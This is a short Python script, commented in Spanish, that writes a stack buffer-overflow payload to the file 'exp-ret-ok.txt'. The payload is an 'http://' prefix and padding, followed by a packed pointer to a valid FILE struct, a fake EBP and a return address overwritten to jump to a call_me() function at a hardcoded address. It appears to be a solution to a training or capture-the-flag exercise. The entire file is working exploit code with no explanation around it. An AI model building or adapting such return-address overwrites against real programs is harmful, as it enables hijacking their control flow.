import struct

CALL_ME = 0x00401530        # dirección de call_me()
padding = 0x41414141        # valor de relleno
ebp     = 0x00000000        # EBP "fake"
xx      = 0x6FFF2960        # FILE *f válido que devuelve fopen

p = bytearray(b'http://')
p += b'A' * 9
p += b'P' * 4
p += struct.pack("<I", xx)
p += b'U' * 4
p += struct.pack("<I", padding)
p += struct.pack("<I", ebp)
p += struct.pack("<I", CALL_ME)


with open("exp-ret-ok.txt", "wb") as f:
    f.write(p)
